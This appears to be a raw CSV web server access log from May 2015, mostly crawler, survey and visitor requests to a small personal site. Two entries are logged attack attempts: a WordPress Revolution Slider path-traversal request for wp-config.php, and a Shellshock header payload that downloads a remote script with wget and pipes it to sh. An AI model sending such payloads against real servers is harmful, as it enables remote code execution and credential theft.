"Host","Log Name","Date Time","Time Zone","Method","URL","Response Code","Bytes Sent","Referer","User Agent"
"178.255.215.92","-","2015-05-04 10:39:24","GMT-0700","GET","/robots.txt",200,385,"-","Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)"
"185.35.62.11","-","2015-05-04 11:15:46","GMT-0700","HEAD","/",200,260,"-","-"
"54.80.96.89","-","2015-05-04 13:14:11","GMT-0700","GET","/",200,508,"-","Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36"
"54.157.225.147","-","2015-05-04 13:27:21","GMT-0700","GET","/",200,565,"-","Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36"
"46.4.32.75","-","2015-05-04 13:46:24","GMT-0700","GET","/robots.txt",200,358,"-","Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
"207.46.13.12","-","2015-05-04 13:49:21","GMT-0700","GET","/robots.txt",200,396,"-","Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
"50.195.145.51","-","2015-05-04 15:53:03","GMT-0700","GET","/",200,600,"-","Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
"104.131.245.170","-","2015-05-04 15:53:31","GMT-0700","HEAD","/",200,279,"http://www.netcraft.com/survey/","Mozilla/4.0 (compatible; Netcraft Web Server Survey)"
"66.249.65.167","-","2015-05-04 16:00:50","GMT-0700","GET","/robots.txt",200,423,"-","Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
"107.170.56.7","-","2015-05-04 16:26:14","GMT-0700","HEAD","/",200,279,"http://www.netcraft.com/survey/","Mozilla/4.0 (compatible; Netcraft Web Server Survey)"
"216.163.188.238","-","2015-05-04 16:27:39","GMT-0700","GET","/",200,600,"-","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0"
"216.38.216.197","-","2015-05-04 17:07:57","GMT-0700","GET","/",200,600,"http://digitalflock.org/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.215 Safari/535.1"
"216.38.216.197","-","2015-05-04 17:07:58","GMT-0700","GET","/",200,565,"-","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_1) AppleWebkit/535.1 (KHTML, like Gecko) Chrome/13.0.782.215 Safari/535.1"
"178.211.172.142","-","2015-05-04 17:19:07","GMT-0700","GET","/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php",404,506,"-","Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ru-ru) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8"
"46.151.212.26","-","2015-05-04 17:33:49","GMT-0700","GET","/",408,516,"() { :; }; /usr/bin/wget -qO- http://r0r.me/r/x.sh | sh","() { :; }; /usr/bin/wget -qO- http://r0r.me/r/x.sh | sh"
"207.46.13.126","-","2015-05-04 17:53:55","GMT-0700","GET","/robots.txt",200,396,"-","Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
"192.111.146.38","-","2015-05-04 18:15:42","GMT-0700","GET","/",200,600,"-","-"
"117.78.13.29","-","2015-05-04 18:26:15","GMT-0700","GET","/robots.txt",200,385,"-","nutch-1.4/Nutch-1.4"
"42.156.139.72","-","2015-05-04 19:58:01","GMT-0700","GET","/",200,565,"-","YisouSpider"
"123.30.175.210","-","2015-05-04 19:59:34","GMT-0700","GET","/robots.txt",200,385,"-","Mozilla/5.0 (compatible; coccoc/1.0; +http://help.coccoc.com/)"
"106.120.173.111","-","2015-05-04 20:24:29","GMT-0700","GET","/robots.txt",200,358,"-","Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
"106.120.173.111","-","2015-05-04 20:24:33","GMT-0700","GET","/robots.txt",200,358,"-","Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
"158.222.10.77","-","2015-05-04 21:59:01","GMT-0700","GET","/ramble/index.php?blogId=48",404,450,"http://spinster.org/","Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
"158.222.10.77","-","2015-05-04 21:59:01","GMT-0700","GET","/",200,508,"http://spinster.org","Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
"141.212.121.152","-","2015-05-04 22:04:51","GMT-0700","GET","/",200,543,"-","-"
"222.95.50.181","-","2015-05-04 22:28:50","GMT-0700","GET","/ramble/index.php?blogId=4",404,533,"-","Mozilla/4.0   (compatible;   MSIE   7.0;   Windows   NT   5.1;   SV1;   Maxthon;   .NET   CLR   2.0.50727;   .NET   CLR   3.0.04506.30)"
"222.95.50.181","-","2015-05-04 22:29:09","GMT-0700","GET","/ramble/index.php?blogId=31",404,476,"-","Mozilla/4.0   (compatible;   MSIE   7.0;   Windows   NT   5.1;   SV1;   Maxthon;   .NET   CLR   2.0.50727;   .NET   CLR   3.0.04506.30)"
"222.95.50.181","-","2015-05-04 22:29:12","GMT-0700","GET","/ramble/index.php?blogId=36",404,476,"-","Mozilla/4.0   (compatible;   MSIE   7.0;   Windows   NT   5.1;   SV1;   Maxthon;   .NET   CLR   2.0.50727;   .NET   CLR   3.0.04506.30)"
"222.95.50.181","-","2015-05-04 22:29:13","GMT-0700","GET","/ramble/index.php?blogId=39",404,476,"-","Mozilla/4.0   (compatible;   MSIE   7.0;   Windows   NT   5.1;   SV1;   Maxthon;   .NET   CLR   2.0.50727;   .NET   CLR   3.0.04506.30)"
"222.95.50.181","-","2015-05-04 22:29:15","GMT-0700","GET","/ramble/index.php?blogId=41",404,476,"-","Mozilla/4.0   (compatible;   MSIE   7.0;   Windows   NT   5.1;   SV1;   Maxthon;   .NET   CLR   2.0.50727;   .NET   CLR   3.0.04506.30)"
"222.95.50.181","-","2015-05-04 22:29:19","GMT-0700","GET","/ramble/index.php?blogId=46",404,476,"-","Mozilla/4.0   (compatible;   MSIE   7.0;   Windows   NT   5.1;   SV1;   Maxthon;   .NET   CLR   2.0.50727;   .NET   CLR   3.0.04506.30)"
"222.95.50.181","-","2015-05-04 22:29:22","GMT-0700","GET","/ramble/index.php?blogId=51",404,476,"-","Mozilla/4.0   (compatible;   MSIE   7.0;   Windows   NT   5.1;   SV1;   Maxthon;   .NET   CLR   2.0.50727;   .NET   CLR   3.0.04506.30)"
"180.110.207.50","-","2015-05-04 22:37:25","GMT-0700","GET","/ramble/index.php?blogId=57",404,507,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1;)"
"208.93.104.8","-","2015-05-04 23:04:45","GMT-0700","HEAD","/",200,260,"-","http://www.yellowpages.com/about/legal/crawl"
"66.249.73.237","-","2015-05-04 23:23:22","GMT-0700","GET","/robots.txt",200,423,"-","Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
"207.46.13.12","-","2015-05-05 00:47:02","GMT-0700","GET","/robots.txt",200,396,"-","Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
"150.70.75.213","-","2015-05-05 01:08:31","GMT-0700","GET","/",200,543,"-","Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
"221.226.222.66","-","2015-05-05 02:17:20","GMT-0700","GET","/ramble/index.php?blogId=4",404,507,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1;)"
"117.247.121.249","-","2015-05-05 04:00:50","GMT-0700","OPTIONS","/album/2001/6-june-24/",200,220,"-","Microsoft Office Protocol Discovery"
"117.247.121.249","-","2015-05-05 04:00:50","GMT-0700","GET","/album/2001/6-june-24/justin_bruise.jpg",404,528,"-","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; ms-office; MSOffice 14)"
"117.247.121.249","-","2015-05-05 04:04:43","GMT-0700","OPTIONS","/album/2001/6-june-24/",200,220,"-","Microsoft Office Protocol Discovery"
"117.247.121.249","-","2015-05-05 04:04:44","GMT-0700","GET","/album/2001/6-june-24/justin_bruise.jpg",404,528,"-","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; ms-office; MSOffice 14)"
"117.247.121.249","-","2015-05-05 04:14:21","GMT-0700","OPTIONS","/album/2001/6-june-24/",200,220,"-","Microsoft Office Protocol Discovery"
"117.247.121.249","-","2015-05-05 04:14:22","GMT-0700","GET","/album/2001/6-june-24/justin_bruise.jpg",404,528,"-","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; ms-office; MSOffice 14)"
"117.247.121.249","-","2015-05-05 04:20:23","GMT-0700","OPTIONS","/album/2001/6-june-24/",200,220,"-","Microsoft Office Protocol Discovery"
"117.247.121.249","-","2015-05-05 04:20:23","GMT-0700","GET","/album/2001/6-june-24/justin_bruise.jpg",404,528,"-","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; ms-office; MSOffice 14)"
"117.247.121.249","-","2015-05-05 04:27:29","GMT-0700","GET","/album/2001/6-june-24/justin_bruise.jpg",404,529,"-","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; ms-office; MSOffice 14)"
"117.247.121.249","-","2015-05-05 04:27:45","GMT-0700","GET","/album/2001/6-june-24/justin_bruise.jpg",404,529,"-","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; ms-office; MSOffice 14)"
"117.247.121.249","-","2015-05-05 04:27:54","GMT-0700","OPTIONS","/album/2001/6-june-24/",200,220,"-","Microsoft Office Protocol Discovery"
"117.247.121.249","-","2015-05-05 04:27:55","GMT-0700","GET","/album/2001/6-june-24/justin_bruise.jpg",404,528,"-","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; ms-office; MSOffice 14)"
"117.247.121.249","-","2015-05-05 04:28:05","GMT-0700","GET","/album/2001/6-june-24/justin_bruise.jpg",404,528,"-","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; ms-office; MSOffice 14)"
"107.23.186.42","-","2015-05-05 05:43:05","GMT-0700","HEAD","/",200,279,"-","-"
"77.247.181.162","-","2015-05-05 06:51:03","GMT-0700","GET","/",200,508,"http://burger-imperia.com/","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36"
"104.128.138.144","-","2015-05-05 08:11:44","GMT-0700","GET","/ramble/index.php?blogId=7",404,450,"http://spinster.org/","Mozilla/5.0 (X11; Linux i686; rv:17.0) Gecko/20100101 Firefox/17.0"
"104.128.138.144","-","2015-05-05 08:11:45","GMT-0700","GET","/",200,508,"http://spinster.org","Mozilla/5.0 (X11; Linux i686; rv:17.0) Gecko/20100101 Firefox/17.0"
"130.211.135.244","-","2015-05-05 08:24:04","GMT-0700","GET","/",200,600,"-","NerdyBot"
"119.63.196.80","-","2015-05-05 08:52:46","GMT-0700","GET","/",200,562,"-","Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
"76.79.23.114","-","2015-05-05 12:01:09","GMT-0700","GET","/",200,562,"-","-"
"212.83.131.8","-","2015-05-05 12:57:25","GMT-0700","GET","/ramble/index.php?blogId=48",404,507,"http://spinster.org/","Mozilla/5.0 (X11; Linux i686; rv:17.0) Gecko/20100101 Firefox/17.0"
"212.83.131.8","-","2015-05-05 12:57:26","GMT-0700","GET","/",200,564,"http://spinster.org","Mozilla/5.0 (X11; Linux i686; rv:17.0) Gecko/20100101 Firefox/17.0"
"66.249.67.121","-","2015-05-05 13:01:21","GMT-0700","GET","/robots.txt",200,423,"-","Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
"66.249.67.78","-","2015-05-05 13:15:12","GMT-0700","GET","/robots.txt",200,423,"-","Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
"66.249.67.179","-","2015-05-05 13:17:04","GMT-0700","GET","/robots.txt",200,423,"-","Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
"50.30.32.186","-","2015-05-05 13:19:35","GMT-0700","GET","/",200,565,"-","Mozilla/5.0 (Windows NT 6.3; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0"
"180.76.5.193","-","2015-05-05 13:48:46","GMT-0700","GET","/robots.txt",200,385,"-","Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
"199.30.20.224","-","2015-05-05 14:44:44","GMT-0700","GET","/photos/black_fleet/YodaClaus.jpg",404,466,"http://sistema-anoat.blogspot.com/2005_12_01_archive.html","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
"123.30.175.207","-","2015-05-05 15:10:45","GMT-0700","GET","/robots.txt",200,385,"-","Mozilla/5.0 (compatible; coccoc/1.0; +http://help.coccoc.com/)"
"211.244.83.215","-","2015-05-05 15:48:16","GMT-0700","GET","/robots.txt",200,423,"http://search.daum.net/","Mozilla/5.0 (compatible; MSIE or Firefox mutant; not on Windows server; + http://tab.search.daum.net/aboutWebSearch.html) Daumoa/3.0"
